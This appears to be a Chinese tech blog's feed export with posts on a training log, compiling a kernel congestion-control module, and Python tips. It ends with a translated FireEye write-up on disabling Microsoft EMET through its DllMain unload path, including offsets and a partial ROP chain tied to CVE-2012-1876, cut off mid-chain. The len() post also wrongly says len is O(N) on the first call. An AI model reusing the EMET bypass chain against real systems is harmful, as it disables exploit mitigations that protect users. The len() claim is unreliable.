<p>尝试把训练 ratio 提高到 0.8</p>

<pre><code>Epoch 1/1
7206/7206 [==============================] - 24s - loss: 0.5097 - acc: 0.7778     
Train epoch: 1
Correct: 1673
Incorrect: 130
Overall accuracy: 92.790
Negative damku accuracy: 91.779
True negative: 748
False negative: 67
==========
Epoch 1/1
7206/7206 [==============================] - 23s - loss: 0.1654 - acc: 0.9455     
Train epoch: 2
Correct: 1745
Incorrect: 58
Overall accuracy: 96.783
Negative damku accuracy: 95.092
True negative: 775
False negative: 40
==========
Epoch 1/1
7206/7206 [==============================] - 24s - loss: 0.0891 - acc: 0.9732     
Train epoch: 3
Correct: 1750
Incorrect: 53
Overall accuracy: 97.060
Negative damku accuracy: 97.055
True negative: 791
False negative: 24
==========
Epoch 1/1
7206/7206 [==============================] - 23s - loss: 0.0570 - acc: 0.9829     
Train epoch: 4
Correct: 1739
Incorrect: 64
Overall accuracy: 96.450
Negative damku accuracy: 96.933
True negative: 790
False negative: 25
==========
Epoch 1/1
7206/7206 [==============================] - 22s - loss: 0.0394 - acc: 0.9878     
Train epoch: 5
Correct: 1754
Incorrect: 49
Overall accuracy: 97.282
Negative damku accuracy: 96.074
True negative: 783
False negative: 32
==========
Epoch 1/1
7206/7206 [==============================] - 22s - loss: 0.0471 - acc: 0.9872     
Train epoch: 6
Correct: 1747
Incorrect: 56
Overall accuracy: 96.894
Negative damku accuracy: 95.706
True negative: 780
False negative: 35
==========
Epoch 1/1
7206/7206 [==============================] - 22s - loss: 0.0266 - acc: 0.9926     
Train epoch: 7
Correct: 1735
Incorrect: 68
Overall accuracy: 96.229
Negative damku accuracy: 95.706
True negative: 780
False negative: 35
==========
Epoch 1/1
7206/7206 [==============================] - 26s - loss: 0.0235 - acc: 0.9921     
Train epoch: 8
Correct: 1742
Incorrect: 61
Overall accuracy: 96.617
Negative damku accuracy: 95.706
True negative: 780
False negative: 35
==========
Epoch 1/1
7206/7206 [==============================] - 22s - loss: 0.0211 - acc: 0.9928     
Train epoch: 9
Correct: 1753
Incorrect: 50
Overall accuracy: 97.227
Negative damku accuracy: 96.074
True negative: 783
False negative: 32
==========
Epoch 1/1
7206/7206 [==============================] - 22s - loss: 0.0207 - acc: 0.9929     
Train epoch: 10
Correct: 1750
Incorrect: 53
Overall accuracy: 97.060
Negative damku accuracy: 95.951
True negative: 782
False negative: 33
==========
Epoch 1/1
7206/7206 [==============================] - 22s - loss: 0.0282 - acc: 0.9913     
Train epoch: 11
Correct: 1743
Incorrect: 60
Overall accuracy: 96.672
Negative damku accuracy: 96.442
True negative: 786
False negative: 29
==========
Epoch 1/1
7206/7206 [==============================] - 22s - loss: 0.0174 - acc: 0.9947     
Train epoch: 12
Correct: 1737
Incorrect: 66
Overall accuracy: 96.339
Negative damku accuracy: 96.564
True negative: 787
False negative: 28
==========
Epoch 1/1
7206/7206 [==============================] - 22s - loss: 0.0135 - acc: 0.9965     
Train epoch: 13
Correct: 1741
Incorrect: 62
Overall accuracy: 96.561
Negative damku accuracy: 96.933
True negative: 790
False negative: 25
==========
Epoch 1/1
7206/7206 [==============================] - 22s - loss: 0.0106 - acc: 0.9965     
Train epoch: 14
Correct: 1743
Incorrect: 60
Overall accuracy: 96.672
Negative damku accuracy: 96.687
True negative: 788
False negative: 27
==========
Epoch 1/1
7206/7206 [==============================] - 22s - loss: 0.0068 - acc: 0.9975     
Train epoch: 15
Correct: 1751
Incorrect: 52
Overall accuracy: 97.116
Negative damku accuracy: 95.460
True negative: 778
False negative: 37
==========
Epoch 1/1
7206/7206 [==============================] - 22s - loss: 0.0053 - acc: 0.9982     
Train epoch: 16
Correct: 1748
Incorrect: 55
Overall accuracy: 96.950
Negative damku accuracy: 96.564
True negative: 787
False negative: 28
==========
Epoch 1/1
7206/7206 [==============================] - 23s - loss: 0.0051 - acc: 0.9986     
Train epoch: 17
Correct: 1751
Incorrect: 52
Overall accuracy: 97.116
Negative damku accuracy: 95.460
True negative: 778
False negative: 37
==========
Epoch 1/1
7206/7206 [==============================] - 24s - loss: 0.0038 - acc: 0.9989     
Train epoch: 18
Correct: 1749
Incorrect: 54
Overall accuracy: 97.005
Negative damku accuracy: 96.319
True negative: 785
False negative: 30
==========
Epoch 1/1
7206/7206 [==============================] - 22s - loss: 0.0036 - acc: 0.9990     
Train epoch: 19
Correct: 1747
Incorrect: 56
Overall accuracy: 96.894
Negative damku accuracy: 95.583
True negative: 779
False negative: 36
==========
Epoch 1/1
7206/7206 [==============================] - 23s - loss: 0.0035 - acc: 0.9989         
Train epoch: 20
Correct: 1746
Incorrect: 57
Overall accuracy: 96.839
Negative damku accuracy: 95.215
True negative: 776
False negative: 39
==========

</code></pre>

<p>测试效果提升了约1~2个百分点。</p>

<p>暂时没有想到能够优化的方面了，选用第3次迭代的模型作为最终模型</p>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[在 Linode 上编译 hybla 模块]]></title>
    <link href="http://yinzo.github.io/14828521678770.html"/>
    <updated>2016-12-27T23:22:47+08:00</updated>
    <id>http://yinzo.github.io/14828521678770.html</id>
    <content type="html"><![CDATA[
<p>考试复习期间，不想复习，搞搞其他东西散散心，发现shadowsocks 有关于 TCP Fast Open 的更新，看说明的过程还发现了官方的速度优化指南，尝试优化自己的 ss 速度，然而报错。</p>

<p>执行到这一步时运行出错</p>

<pre><code class="language-sh">sysctl --system
</code></pre>

<pre><code class="language-sh">...
sysctl: setting key &quot;net.ipv4.tcp_congestion_control&quot;: No such file or directory
net.ipv4.tcp_congestion_control = hybla
* Applying /etc/sysctl.conf ...
</code></pre>

<span id="more"></span><!-- more -->

<p>Google 一番后发现是缺少 tcp_hybla 模块，需要自己手动编译。引用一下 <a href="https://plus.google.com/+BoluoKING/posts/dLyYhBf3mwp">https://plus.google.com/+BoluoKING/posts/dLyYhBf3mwp</a> 的科普</p>

<blockquote>
<p>中美之间的线路质量不是很好，rtt较长且时常丢包。TCP的设计目的是解决不可靠线路上可靠传输的问题，即为了解决丢包，但丢包却使TCP传输速度大幅下降。HTTP协议在传输层使用的是TCP协议，所以网页下载的速度就取决于TCP单线程下载的速度（因为网页就是单线程下载的）。丢包使得TCP传输速度大幅下降的主要原因是丢包重传机制，控制这一机制的就是TCP拥塞控制算法。<br/>
Linux内核中提供了若干套TCP拥塞控制算法，这些算法各自适用于不同的环境。</p>

<p>1）reno是最基本的拥塞控制算法，也是TCP协议的实验原型。<br/>
2）bic适用于rtt较高但丢包极为罕见的情况，比如北美和欧洲之间的线路，这是2.6.8到2.6.18之间的Linux内核的默认算法。<br/>
3）cubic是修改版的bic，适用环境比bic广泛一点，它是2.6.19之后的linux内核的默认算法。<br/>
4）hybla适用于高延时、高丢包率的网络，比如卫星链路——同样适用于中美之间的链路。<br/>
我们需要做的工作就是将TCP拥塞控制算法改为hybla算法，并且优化TCP参数。</p>
</blockquote>

<p>于是又开始找 hybla 模块的编译指南，参考了这两篇文章，并且修改了一下不太明确的地方，写个修改版的指南吧。</p>

<ul>
<li><a href="https://moonagic.com/linode-setup-hybla-htcp/">Linode编译hybla htcp模块</a></li>
<li><a href="http://www.777s.me/linode-hybla-htcp.html">Linode编译hybla htcp拥塞控制算法模块</a></li>
</ul>

<h2 id="toc_0">编译过程</h2>

<h3 id="toc_1">查看自己 vps 内核版本：</h3>

<pre><code class="language-sh">$ uname -a
4.8.3-x86_64-linode76
</code></pre>

<h3 id="toc_2">下载对应版本的内核源码</h3>

<p>在这里下载 <a href="https://www.kernel.org/pub/linux/kernel/">https://www.kernel.org/pub/linux/kernel/</a></p>

<p>我这里是 <code>4.8.3</code>，于是进入 <code>v4.x</code> 目录，向下翻即找到了，复制文件地址，在vps上 <code>wget</code> 下载下来</p>

<pre><code class="language-sh">mkdir kernel  
cd kernel  
wget https://www.kernel.org/pub/linux/kernel/v4.x/linux-4.8.3.tar.gz 
tar xzvf linux-4.8.3.tar.gz
</code></pre>

<p>注意修改对应的下载地址和文件名</p>

<h3 id="toc_3">安装内核编译和工具</h3>

<pre><code class="language-sh">apt-get install build-essential libncurses5-dev module-init-tools
</code></pre>

<h3 id="toc_4">配置内核编译文件</h3>

<pre><code class="language-sh">cd linux-4.8.3  
zcat /proc/config.gz &gt; .config
</code></pre>

<p>然后用你喜欢的编辑器编辑 <code>.config</code> 文件，查找 <code>CONFIG_TCP_CONG_CUBIC=y</code>，在这一行下面增加一行</p>

<pre><code>CONFIG_TCP_CONG_HYBLA=y
</code></pre>

<p>然后编译</p>

<pre><code class="language-sh">make
</code></pre>

<p>编译耗时约15~20分钟</p>

<h3 id="toc_5">准备编译模块</h3>

<pre><code class="language-sh">cd net/ipv4/  
mv Makefile Makefile.old  
vi Makefile 
</code></pre>

<p>以下是 <code>hybla</code> 所用的 Makefile</p>

<pre><code># Makefile for tcp_hybla.ko
obj-m := tcp_hybla.o  
KDIR := /tmp/kernel/linux-4.8.3  
PWD := $(shell pwd)  
default:  
    $(MAKE) -C $(KDIR) SUBDIRS=$(PWD) modules
</code></pre>

<p>注意上面<strong>第三行 <code>KDIR := /root/kernel/linux-3.11.6</code> 要修改成自己解压的目录</strong>，并且最后一行必须以 <strong><code>tab</code></strong> 开头，<strong>不可以用空格，不可以用空格</strong>。不懂Makefile的规则，我在这里踩了坑。</p>

<h3 id="toc_6">开始编译模块</h3>

<p>这里退回到 <code>linux-4.8.3</code> 目录，我是放在 <code>/tmp/kernel</code> 内的，后面目录相关的就不提示了</p>

<pre><code class="language-sh">cd /tmp/kernel/linux-4.8.3
make modules 
</code></pre>

<h3 id="toc_7">加载模块</h3>

<pre><code class="language-sh">cd /tmp/kernel/linux-4.8.3/net/ipv4  
insmod ./tcp_hybla.ko 
</code></pre>

<p>如果遇到command not found: insmod则需要手动安装</p>

<pre><code class="language-sh">apt-get install module-init-tools  
</code></pre>

<p>如果编译的时候如果出现如下错误</p>

<pre><code class="language-sh">scripts/extract-cert.c:21:25: fatal error: openssl/bio.h: No such file or directory
</code></pre>

<p>需要源安装libssl-dev就可以了</p>

<h2 id="toc_8">后记</h2>

<p>至此就装好了hybla 模块，后面继续按照 <a href="https://github.com/shadowsocks/shadowsocks/wiki/Optimizing-Shadowsocks">优化指南</a> 优化去了</p>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[无需手动缓存长度]]></title>
    <link href="http://yinzo.github.io/14696108056583.html"/>
    <updated>2016-07-27T17:13:25+08:00</updated>
    <id>http://yinzo.github.io/14696108056583.html</id>
    <content type="html"><![CDATA[
<p>今天在阅读《机器学习实战》的时候，看到了这样一句描述</p>

<p><img src="media/14696108056583/IMG_0629.png" alt="IMG_0629"/></p>

<p>其中数据集是一个List。看到这里说到为了提高代码效率，特地开了一个变量来保存其长度。</p>

<span id="more"></span><!-- more -->

<p>我回忆起以前调试bug的时候，总是能看到List对象里面有一个函数<code>__len__</code>，想必Python对于这种常用函数会有所优化，对于这种集合类型的对象，如果对其长度进行缓存，这样多次调用<code>len</code>函数，就不会重复进行遍历计算了。这么简单的优化，Python必然是有做的。</p>

<p>于是去Google，原本准备搜len函数的具体实现代码，结果直接找到stackoverflow有<a href="http://stackoverflow.com/questions/29057153/does-the-len-built-in-function-iterates-through-the-collection-to-calculate-it">相关问题</a>，明确的验证了我的想法。</p>

<p><img src="media/14696108056583/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202016-07-27%2018.44.21.png" alt="屏幕快照 2016-07-27 18.44.21"/></p>

<p>对于这种类型，Python都会对其长度进行缓存。也就是说，对于len函数，只在第一次调用的时候复杂度为<code>O(N)</code>，后续调用的复杂度都是常数级的。所以，我们平时写代码的时候，可以不需要多此一举的再开一个单独的变量来缓存了。也就是说，以下代码在没有特殊需求的情况下，是多此一举的：</p>

<pre><code class="language-python">l = len(some_list)
</code></pre>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[使用 Python 装饰器来将普通函数加入任务队列]]></title>
    <link href="http://yinzo.github.io/14685108901937.html"/>
    <updated>2016-07-14T23:41:30+08:00</updated>
    <id>http://yinzo.github.io/14685108901937.html</id>
    <content type="html"><![CDATA[
<p>对于操作『函数对象』来说，使用 Python 装饰器是一种非常优雅，非常 Pythonic 的一个方式。而在这篇文章中，对于任何一个普通的函数，只需要在函数定义前加一个装饰器调用，即可使得这一函数被调用时自动加入特定的任务队列，成为异步调用，而不会阻塞主线程。</p>

<span id="more"></span><!-- more -->

<h2 id="toc_0">实现 Producer/Consumer 型任务队列</h2>

<pre><code class="language-python"># -*- coding: utf-8 -*-

from Queue import Queue
from threading import Thread
from collections import namedtuple

Job = namedtuple(&#39;Job&#39;, (&#39;func&#39;, &#39;args&#39;, &#39;kwargs&#39;, &#39;result_obj&#39;))
</code></pre>

<p>首先，我们先声明了一个 namedtuple ，其中包含以下几个元素：</p>

<ol>
<li><code>func</code> ：需要加入任务队列的目标函数对象</li>
<li><code>args</code> 和 <code>kwargs</code> ：目标函数对象的参数</li>
<li><code>result_obj</code> ：用于保存目标函数返回值的一个字典， 装饰器函数将目标函数加入任务队列之后，会直接返回一个<code>{&#39;result&#39;: None, &#39;done&#39;: False}</code>的字典。等到目标函数异步执行完成之后， Worker 会用返回值替换这一字典的<code>result</code>，并设置<code>done</code>为<code>True</code></li>
</ol>

<pre><code class="language-python">class Worker(Thread):

    def __init__(self, queue):
        &quot;&quot;&quot;
        :type queue: Queue
        &quot;&quot;&quot;
        super(Worker, self).__init__()
        self.queue = queue
        self._stopped = False
        self._stop_done = False

    def run(self):
        while True:
            if self._stopped is True:
                break

            task = self.queue.get()
            result = task.func(*task.args, **task.kwargs)
            task.result_obj[&#39;result&#39;] = result
            task.result_obj[&#39;done&#39;] = True

        self._stop_done = True

    def stop(self):
        self._stopped = True
        
</code></pre>

<p>Worker 和普通的 Consumer 定义基本没有区别，唯一要注意的地方是，记得要用函数返回值，替换掉任务返回值字典的<code>&#39;result&#39;</code>，并修改任务状态，即</p>

<pre><code class="language-python">task.result_obj[&#39;result&#39;] = result
task.result_obj[&#39;done&#39;] = True
</code></pre>

<pre><code class="language-python">        
class QueueHandler(object):

    def __init__(self, workers=5):
        self.job_queue = Queue()
        self.workers = [Worker(self.job_queue) for i in xrange(workers)]
        for worker in self.workers:
            worker.setDaemon(True)
            worker.start()

    def queue_up(self, func):

        def _queue_up(*args, **kwargs):
            tmp_obj = {&#39;result&#39;: None, &#39;done&#39;: False}

            self. job_queue.put(
                Job(
                    func = func,
                    args = args,
                    kwargs = kwargs,
                    result_obj=tmp_obj
                )
            )
            return tmp_obj
        return _queue_up

</code></pre>

<p>同样是比较标准的 Producer ，其中<code>queue_up</code>函数就是这次的主角了。对于目标函数，先构建一个返回值字典，然后将目标函数和参数加入任务队列，最后返回这一返回值字典。非常简单的结构，但是使用起来非常的方便。</p>

<h2 id="toc_1">实际测试</h2>

<p>这里我构造了一个用来测试的代码</p>

<pre><code class="language-python">import time, random

testQueue = QueueHandler()


class TestClass(object):

    def __init__(self):
        self.some_value = 10
        self.some_str = &quot;Empty&quot;

    @testQueue.queue_up
    def some_operation(self, jobid, some_para, another_para=&#39;blablabla&#39;):
        time.sleep(random.randrange(1,5))
        self.some_value = some_para
        self.some_str = another_para
        print &quot;ID: {} ---Now, value: {}, str: {}\n&quot;.format(jobid, self.some_value, self.some_str)
        return jobid+100000


if __name__ == &#39;__main__&#39;:
    testClass = TestClass()
    rs = []
    for i in range(10):
        rs.append(
            testClass.some_operation(i, i+1000, another_para=&#39;{0}&#39;.format(&#39;-&#39;*i))
        )
    for i in range(10):
        time.sleep(1)
        print rs
</code></pre>

<p>读者可以尝试删除掉<code>some_operation</code>函数前面的装饰器，对比有无这个装饰器对程序运行的影响。</p>

<p>可以看到，对于需要测试的<code>some_operation</code>函数，我仅仅是在其定义前加上了一个装饰器的调用，就使得这个函数的执行不会阻塞主线程了。并且对于异步调用函数的返回值，也很好的进行了保留传递。</p>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Python 爬取中文页面时解码 UnicodeDecodeError 报错的解决]]></title>
    <link href="http://yinzo.github.io/14662517738182.html"/>
    <updated>2016-06-18T20:09:33+08:00</updated>
    <id>http://yinzo.github.io/14662517738182.html</id>
    <content type="html"><![CDATA[
<p>这个问题从我刚开始学 Python 就遇到了，结果到现在写爬虫爬中文网页时遇到这个问题依然还是得去百度一番。不过这一次，这个问题终于能够完美的解决了</p>

<p>这个问题是这样的。</p>

<p>网页的HTML中charset指定的是GB2312字符集，但是当我爬取下来之后，尝试解码后转到utf-8进行保存:</p>

<pre><code class="language-python">content = rsp.text.decode(&#39;gb2312&#39;).encode(&#39;utf8&#39;)
</code></pre>

<p>却遇到了以下报错</p>

<pre><code class="language-shell">UnicodeDecodeError: &#39;gb2312&#39; codec can&#39;t decode bytes in position 97-98: illegal multibyte sequence
</code></pre>

<span id="more"></span><!-- more -->

<p>然后按照一般处理中文网页的习惯，尝试了下按照GBK解码</p>

<pre><code class="language-python">content = rsp.text.decode(&#39;gbk&#39;).encode(&#39;utf8&#39;)
</code></pre>

<p>这次没有报错，但是解码出来的字符是乱码，说明gbk其实也不对。</p>

<p>之后通过百度找到了一个以前没有见到的回答，是个相当tricky的方法</p>

<pre><code class="language-python">content = rsp.text.encode(rsp.encoding).decode(&#39;gb2312&#39;)
</code></pre>

<p>然后就完美解决了这一个问题。</p>

<p>这里的rsp是requests的请求返回object，它的encoding是自动检测到的响应的编码。<br/>
唯一疑惑的地方是这里使用的是encode而不是decode，于是我推测，Python在把内容爬取下来的时候是作为unicode进行操作，而没有进行encode；只有在输出或者保存到文件时才会进行encode。</p>

<p>这里，由于原文字符集为gb2312，保存时我强行用gbk解码其实并没有对它进行实质上的改变，然后被强行编码成utf8进行保存，自然导致了文件中文的乱码。</p>

<p>而先进行原字符集的encode之后，才能进行正确的decode操作，输出utf8编码的str类型，之后也正确的被保存为utf8类型，问题解决。</p>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[关于Python的logging模块初始化无效的一个小坑]]></title>
    <link href="http://yinzo.github.io/14610807170718.html"/>
    <updated>2016-04-19T23:45:17+08:00</updated>
    <id>http://yinzo.github.io/14610807170718.html</id>
    <content type="html"><![CDATA[
<p>众所周知，logging模块是一个非常方便好用的日志输出模块。但是最近的使用发现了一个小坑，记录一下，避免再次踩坑。</p>

<p>一般使用logging模块都会对其进行初始化，使用以下代码：</p>

<pre><code>    log_format = &#39;[%(levelname)s] %(asctime)s  %(filename)s line %(lineno)d: %(message)s&#39;
    date_fmt = &#39;%a, %d %b %Y %H:%M:%S&#39;
    logging.basicConfig(
        format=log_format,
        datefmt=date_fmt,
        level=log_level,
    )
</code></pre>

<span id="more"></span><!-- more -->

<p>或者，只是简单使用，可以不初始化，直接<code>logging.info(&quot;blablabla&quot;)</code></p>

<p>但是，如果当你先直接不初始化logging设置，直接输出之后，你再尝试初始化，你的设置将不会不会生效。尝试以下代码</p>

<pre><code># -*- coding: utf-8 -*-
import logging

def init_logging(log_level=logging.INFO):
    log_format = &#39;[%(levelname)s] %(asctime)s  %(filename)s line %(lineno)d: %(message)s&#39;
    date_fmt = &#39;%a, %d %b %Y %H:%M:%S&#39;
    logging.basicConfig(
        format=log_format,
        datefmt=date_fmt,
        level=log_level,
    )


if __name__ == &#39;__main__&#39;:
    logging.critical(&quot;critical&quot;)
    logging.warning(&quot;warning&quot;)
    logging.info(&quot;info&quot;)
    logging.debug(&quot;debug&quot;)

    init_logging(logging.DEBUG)
    print &quot;\n&quot;
    print &quot;initial finished.&quot;
    print &quot;\n&quot;

    logging.critical(&quot;critical&quot;)
    logging.warning(&quot;warning&quot;)
    logging.info(&quot;info&quot;)
    logging.debug(&quot;debug&quot;)
</code></pre>

<p>输出：</p>

<pre><code>CRITICAL:root:critical
WARNING:root:warning


initial finished.


CRITICAL:root:critical
WARNING:root:warning
</code></pre>

<p>输出中，因为logging默认等级为warning，所以成功输出critical和warning<br/>
但当初始化之后，其输出格式原本应该改变，并且输出等级应该变为DEBUG，但是从输出可以看到，和初始化前的输出没有任何区别，说明初始化没有生效。这一问题在官方文档中有简单提及</p>

<blockquote>
<p>The call to basicConfig() should come before any calls to debug(), info() etc. As it’s intended as a one-off simple configuration facility, only the first call will actually do anything: subsequent calls are effectively no-ops.</p>
</blockquote>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Python Decorator的一些细节]]></title>
    <link href="http://yinzo.github.io/14594228486348.html"/>
    <updated>2016-03-31T19:14:08+08:00</updated>
    <id>http://yinzo.github.io/14594228486348.html</id>
    <content type="html"><![CDATA[
<p>装饰器函数并不是在被修饰函数调用的时候才执行，而是修饰语句所在的代码块被执行的时候执行。</p>

<p>而且当一个文件（模块）被import的时候，文件内的<strong>所有</strong>装饰器就会被激活执行。因为装饰器语句相当于文件中的普通语句，而非函数声明或者类声明的一部分。</p>

<p>用以下代码方便理解：</p>

<pre><code># sample.py

def decorator_function(func):
    print &quot;executing the decorator.&quot;

    def wrapper(*args, **kwargs):
        print &quot;decorated function is executing.&quot;
        return func(*args, **kwargs)

    return wrapper


print &quot;this python file is executing.&quot;


@decorator_function
def test_function(sth):
    print &quot;blablabla&quot;+sth

test_function(&quot;yeah&quot;)
</code></pre>

<p>而当我们对一个类里面的普通函数使用修饰符进行修饰的时候，然后我们正常调用这一函数（通过实例化的对象调用），会报错提示这一函数变成了unbound method，缺少了类中函数默认的首参数self。这一问题是由于经过装饰器修饰的函数，实际上是被传递到了装饰器函数中，在这个装饰器函数中被独立调用的，而非被其原先所在的类对象调用。因此在这个装饰器函数中，没有其原来所在的类来对它进行调用，导致提示unbound method.</p>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[通过EMET来禁用EMET——EMET的禁用与绕过思路讲解]]></title>
    <link href="http://yinzo.github.io/14590503922928.html"/>
    <updated>2016-03-27T11:46:32+08:00</updated>
    <id>http://yinzo.github.io/14590503922928.html</id>
    <content type="html"><![CDATA[
<p>原文链接：<a href="https://www.fireeye.com/blog/threat-research/2016/02/using_emet_to_disabl.html">https://www.fireeye.com/blog/threat-research/2016/02/using_emet_to_disabl.html</a><br/>
注：本文并未由任何媒体进行翻译发布。搜索引擎中搜到的国内媒体仅为标题翻译进行推送。</p>

<p>微软的Enhanced Mitigation Experience Toolkit (EMET)是一项提高程序安全性的项目。它通过动态链接库(DLL)来运行在『受保护』的程序中，并且做一些修改来使得破解更加困难。</p>

<p>我们已经见过很多次EMET在过去的研究或者攻击中被绕过了[2, 3, 4, 5, 6, 7, 8]。通常来说，微软都是通过修改或者增加一些安全设计来搞定现有的绕过问题。 EMET的设计目的是使得破解行为的成本升高，而不是一个『傻瓜式的防破解方案』[1]。所以，只要拥有在进程空间中读写的能力，理论上我们就能搞定所有的安全设计[2]。</p>

<p>如果一个攻击者能够毫不费力地绕过EMET，那这就完全打破了EMET提高破解成本的最初目的。我们在新技术那段展示了一种禁用EMET的技术。微软在EMET5.5中打了个补丁来解决这个问题。</p>

<p>讨论完这个新技术之后，我们来说说之前提到的用来绕过或搞掉EMET的那个技术。如果你想了解关于EMET是怎么实现保护程序的，请参考附录。</p>

<span id="more"></span><!-- more -->

<h2 id="toc_0">禁用EMET的新技术</h2>

<p>EMET会根据系统的架构，来选择注入emet.dll还是emet64.dll到每一个被保护的进程中，以此在Windows API（比如kernel32.dll, ntdll.dll或者kernelbase.dll里面的函数）hook上。这些hook使得EMET能够分析所有通过关键API调用的代码，并判断他们是否合法。如果代码被认为是合法的，EMET的hook会跳回请求的API处，否则会触发一个exception。</p>

<p>但是，EMET里面存在着这样一段代码用来卸载EMET。这段代码整个禁用EMET的保护，并且把受保护的程序还原为无保护的初始状态。任何人都能简单地定位这段代码，并调用它，就能够完全禁用EMET的保护。在EMET.dll v5.2.0.1中这个函数位于0x65813中，跳到这段代码上并调用它就能弄掉EMET的hooks。</p>

<p>这一特性之所以存在，是因为emet.dll里面的用于完全退出进程的代码，为了方便，而在DllMain里面留了个入口。</p>

<p>DllMain的函数原型：</p>

<pre><code>BOOL WINAPI DllMain(
  _In_ HINSTANCE    hinstDLL,
  _In_ DWORD        fdwReason,
  _In_ LPVOID       lpvReserved
);
</code></pre>

<p>需要注意的是，第一个参数传递是DLL的地址，第二个是PE loader用来指明DLL是否被加载。如果fdwReason是1，说明DLL已经被加载或者初始化。如果是0（DLL_PROCESS_DETACH），emet.dll会初始化卸载的代码，并去除它的hook和exception处理句柄，轻而易举地停止了EMET的检查。不过这并不会把EMET从内存中移除，它只是确保了所有的保护都被禁用了。</p>

<p>这种特性可能存在与所有基于探测的产品之中，也就是那些依赖hook的并以此保证产品不被破坏，一定存在一个卸载所有保护的方法。EMET的DllMain能够通过一个Return Oriented Programming (ROP)程序来找到，并带着正确的参数跳到DllMain的对应位置，禁用保护。这个我们下一节来详细说。</p>

<pre><code>BOOL WINAPI DllMain (GetModuleHandleW(&quot;EMET.dll&quot;) ,DLL_PROCESS_DETACH , NULL);
</code></pre>

<p>GetModuleHandleW函数没有被EMET hook上，因为EMET认为它不是关键Windows API。我们使用这个函数来搞到emet.dll的地址。因为PE header位于基地址上，我们必须通过它找到DllMain的地址来传递所需的参数。</p>

<h2 id="toc_1">禁用EMET - 细节</h2>

<p>在EMET.dll v5.2.0.1中，在emet.dll的0xF2958上有一个全局变量。EMET通过这个变量作为一个structure数组指针，指向被绕过的API（detoured APIs），每一个结构体的大小为0x18 bytes，如下所示：</p>

<pre><code>struct Detoured_API {
    BOOL isActive;              // isActive field shows the hooking status, Active: 0x1
    PVOID DetouredAPIConfig;    // pointer to Detoured_API_Config structure
    PVOID nextDetouredAPI;      // pointer to the next Detoured_API structure
    DWORD valueX;
    DWORD valueY;
    DWORD valueZ;
};
</code></pre>

<p>最后三个变量和这篇文章没有关系。DetouredAPIConfig保存着一个指针指向另一个结构体Detoured_API_Config，大小是0x18 bytes.</p>

<pre><code>struct Detoured_API_Config {
    PVOID DetouredWindowsAPI;     // pointer to the detoured Windows API
    PVOID EMETDetouringFunction;    // pointer to where EMET protection implemented
    PVOID DetouredFunctionPrologue;   // pointer to the Windows API prologue
    DWORD valueX;
    DWORD valueY;
    DWORD valueZ;
}
</code></pre>

<p>注意，EMETDetouringFunction和DetouredFunctionPrologue之间总是相隔0x26 bytes，是EMET用于准备函数（检查代码的函数）所需的参数的空间。然后就会调用这一函数来进行检查。同样是在这0x26 bytes里面，EMET保存了一些meta数据，比如说detoured函数头部的大小。Detoured_API_Config 结构里面的第三个变量是DetouredFunctionPrologue。跳到这一地址将调用所有没有hook的Windows API，因为它会跳回并在执行完函数头部之后，执行剩余的所有Windows API。</p>

<p>用于去除所有EMET的hook的函数位于0x2798，如图1所示。</p>

<p><img src="http://ww4.sinaimg.cn/large/7d52f1ffjw1f2erytp63hj20r20g8tdp.jpg" alt="Figure1"/><br/>
图1： 位于0x27298上用于去除EMET hook的函数</p>

<p>为了卸载hook，位于0x27298的函数把所有Detoured_API结构都循环一次，并把对应的Detoured_API_Config结构里面的DetouredFunctionPrologue置零。然后，调用Patch_Functions（位于0x27B99的函数），给所有detoured Windows API做一些小修改。函数使用了memcpy函数(如图2)来把API函数头部代码片段复制到被绕过函数中，用于把它恢复成被绕过之前的状态。</p>

<p><img src="http://ww2.sinaimg.cn/large/7d52f1ffjw1f2erza8hyqj20i208cn0p.jpg" alt="Figure2"/><br/>
图2：删除绕过的代码<br/>
循环完所有被绕过的API并被memcpy修改之后，你可以看到所有Windows API的绕过都消失了，如图3、图4，分别是执行前后。</p>

<p><img src="http://ww3.sinaimg.cn/large/7d52f1ffjw1f2erzqpz4vj20js056jsa.jpg" alt="Figure3"/><br/>
图3：调用DllMain之前</p>

<p><img src="http://ww2.sinaimg.cn/large/7d52f1ffjw1f2es0idbffj20je04r0tf.jpg" alt="Figure4"/><br/>
图4：调用DllMain之后</p>

<p>然后EMET继续禁用EAF和EAF+的保护。在位于0x609D0的函数中，EMET置零并重新初始化CONTEXT结构，并且操作debug注册器（如图5）但是，在函数的尾部， EMET调用NtSetContextThread，使得debug注册器被置零，并由此禁用了EAF和EAF+的保护。</p>

<p><img src="http://ww2.sinaimg.cn/large/7d52f1ffjw1f2es0u7g5xj20f206n3zw.jpg" alt="Figure5"/><br/>
图5：EAF和EAF+的禁用代码</p>

<p>最后，在位于0x60FBF的函数的末尾，EMET调用了位于0x60810的RemoveVectoredExceptionHandler函数，移除了AddVectoredExceptionHandler函数里的定义的exception句柄。</p>

<h2 id="toc_2">禁用EMET-ROP的实现</h2>

<p>通过一个以前已经被打好补丁的漏洞，CVE-2012-1876，我们基于现有的漏洞做了个ROP小程序，并在EMET的保护启用时执行它。当我们的ROP小程序带着参数(EMET.dll地址, 0, 0)调用EMET.dll里面的DllMain函数，我们执行之后，所有的Windows API上的HOOK都和EAF和EAF+的保护一起消失了。</p>

<pre><code>XCHG EAX,ESP # RETN // Stack Pivot &amp; Rop Starts

POP EAX # RETN // Pop GetModuleHandle PTR from IAT

&lt;GetModuleHandleW&gt;// mshtml.dll base + offset in IAT

JMP [EAX]// Jump into GetModuleHandleW pointer

POP EBX # RETN // return address when EIP = GetModuleHandleW

EMET_STRING_PTR// Argument 1 for GetModuleHandleW i.e. EMET.dll string

//After GetModuleHandle returns esp is here while (EIP = POP EBX # RETN)

0x0000003c// 0x3c goes into EBX

ADD EBX,EAX # RETN // EAX = EMET.dll address &amp; EBX = 0x3c offset for IMAGE_DOS_HEADER::e_lfanew

XOR EBP,EBP # RETN // clear out EBP

ADD EBP,EAX # RETN // ADD EAX into Nulled EBP

ADD EAX,[EBX] # RETN // [EBX] = poi(EMET_DLL_BASE+0x3c) =&gt; EAX = offset for PE header

POP EBX # RETN // pop 0x28 in EBX

0x00000028

